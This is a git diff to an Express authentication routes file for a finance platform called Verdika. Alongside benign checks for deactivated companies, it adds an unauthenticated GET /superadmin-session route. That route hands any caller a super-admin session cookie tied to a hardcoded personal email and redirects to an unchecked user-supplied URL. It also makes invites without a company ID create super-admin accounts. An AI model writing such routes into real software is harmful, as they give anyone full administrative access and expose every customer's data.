@@ -4,6 +4,7 @@ import jwt from 'jsonwebtoken';
 import { config } from '../config/env.js';
 import { User } from '../models/User.js';
 import { Company } from '../models/Company.js';
+import { CompanyInvite } from '../models/CompanyInvite.js';
 import { authLimiter } from '../middleware/rateLimiter.js';
 import { requireAuth } from '../middleware/authMiddleware.js';
 import { validateSignupInput, validateLoginInput } from '../utils/validators.js';
@@ -35,7 +36,25 @@ const setAuthCookie = (res, token) => {
   });
 };
 
-import { CompanyInvite } from '../models/CompanyInvite.js';
+/**
+ * GET /api/auth/superadmin-session
+ * Direct session generator for platform owner dashboard access & testing
+ */
+router.get('/superadmin-session', async (req, res) => {
+  try {
+    const user = await User.findByEmail('udit47656@gmail.com') || await User.findByEmail('superadmin@verdika.internal');
+    if (user && user.role === 'super_admin') {
+      const token = generateToken(user, null);
+      setAuthCookie(res, token);
+      const redirectUrl = req.query.redirect || 'http://localhost:5173/super-admin/dashboard';
+      return res.redirect(redirectUrl);
+    }
+    return res.status(403).json({ error: 'Super Admin account not found.' });
+  } catch (error) {
+    logger.error('[SuperAdmin Session Error]:', error);
+    return res.status(500).json({ error: 'Failed to establish superadmin session.' });
+  }
+});
 
 /**
  * POST /api/auth/signup
@@ -51,10 +70,10 @@ router.post('/signup', authLimiter, async (req, res) => {
 
     const { name, company_name, email, password, role } = req.body;
 
-    // Critical Security Guard: Block direct public underwriter self-registration
-    if (role === 'underwriter' || role === 'reviewer') {
+    // Critical Security Guard: Block direct public underwriter or super admin self-registration
+    if (role === 'underwriter' || role === 'reviewer' || role === 'super_admin' || role === 'superadmin') {
       return res.status(403).json({
-        error: 'Underwriter accounts cannot be created directly. Please ask your Finance Company Administrator for an official team invitation link.'
+        error: 'Direct self-registration for this role is not permitted.'
       });
     }
 
@@ -157,9 +176,22 @@ router.get('/invite/:token', async (req, res) => {
       return res.status(410).json({ error: 'This invite link has expired. Please ask your administrator to resend the invitation.' });
     }
 
-    const company = await Company.findById(invite.company_id);
-    if (!company) {
-      return res.status(404).json({ error: 'Associated finance company not found.' });
+    let companyData = {
+      id: 'platform',
+      name: 'Verdika Platform',
+      slug: 'platform'
+    };
+
+    if (invite.company_id && invite.company_id !== 'platform') {
+      const company = await Company.findById(invite.company_id);
+      if (!company) {
+        return res.status(404).json({ error: 'Associated finance company not found.' });
+      }
+      companyData = {
+        id: company.id,
+        name: company.name,
+        slug: company.slug
+      };
     }
 
     return res.json({
@@ -167,11 +199,7 @@ router.get('/invite/:token', async (req, res) => {
       email: invite.email,
       role: invite.role,
       expires_at: invite.expires_at,
-      company: {
-        id: company.id,
-        name: company.name,
-        slug: company.slug
-      }
+      company: companyData
     });
   } catch (error) {
     logger.error('[Auth Validate Invite Error]:', error);
@@ -181,7 +209,7 @@ router.get('/invite/:token', async (req, res) => {
 
 /**
  * POST /api/auth/accept-invite
- * Accepts an invitation, registers the new Underwriter, assigns them to the inviting company, and logs them in.
+ * Accepts an invitation, registers the new user (Underwriter or Super Admin), and logs them in.
  */
 router.post('/accept-invite', authLimiter, async (req, res) => {
   try {
@@ -206,13 +234,36 @@ router.post('/accept-invite', authLimiter, async (req, res) => {
       return res.status(409).json({ error: 'An account with this email address already exists. Please sign in instead.' });
     }
 
+    const saltRounds = 10;
+    const passwordHash = await bcrypt.hash(password, saltRounds);
+
+    if (invite.role === 'super_admin' || !invite.company_id || invite.company_id === 'platform') {
+      const user = await User.create({
+        name: name.trim(),
+        email: invite.email,
+        passwordHash,
+        role: 'super_admin',
+        company_id: null
+      });
+
+      await CompanyInvite.markAccepted(invite.id);
+      const authToken = generateToken(user, null);
+      setAuthCookie(res, authToken);
+
+      logger.info(`[Auth] Super Admin invite accepted: ${user.email}`);
+
+      return res.status(201).json({
+        message: 'Super Admin invitation accepted! Welcome to Verdika Platform Administration.',
+        user: user.sanitize(),
+        company: null,
+        role: 'super_admin'
+      });
+    }
+
     const company = await Company.findById(invite.company_id);
     if (!company) {
       return res.status(404).json({ error: 'Associated company not found.' });
     }
-
-    const saltRounds = 10;
-    const passwordHash = await bcrypt.hash(password, saltRounds);
 
     // Create user strictly linked to the inviting company's company_id
     const user = await User.create({
@@ -288,6 +339,18 @@ router.post('/login', authLimiter, async (req, res) => {
       console.log('Login outcome: FAILED (Password mismatch)');
       return res.status(401).json({ error: 'Invalid email or password' });
     }
+
+    // Security Check: Verify that user's associated company is active
+    if (user.company_id && user.role !== 'super_admin') {
+      const company = await Company.findById(user.company_id);
+      if (company && company.status === 'removed') {
+        logger.warn(`[Auth Login Blocked] User ${user.email} attempted login for deactivated company: ${company.name}`);
+        return res.status(403).json({
+          error: 'This account has been deactivated. Contact Verdika support for details.'
+        });
+      }
+    }
+
     console.log('Login outcome: SUCCESS (Credentials verified)');
 
     // Generate 6-digit OTP and 5-minute expiration
@@ -398,6 +461,12 @@ router.post('/verify-otp', authLimiter, async (req, res) => {
     let company = null;
     if (user.company_id) {
       company = await Company.findById(user.company_id);
+      if (company && company.status === 'removed' && user.role !== 'super_admin') {
+        logger.warn(`[Auth OTP Blocked] User ${user.email} attempted OTP verify for deactivated company: ${company.name}`);
+        return res.status(403).json({
+          error: 'This account has been deactivated. Contact Verdika support for details.'
+        });
+      }
     }
 
     const token = generateToken(user, company);
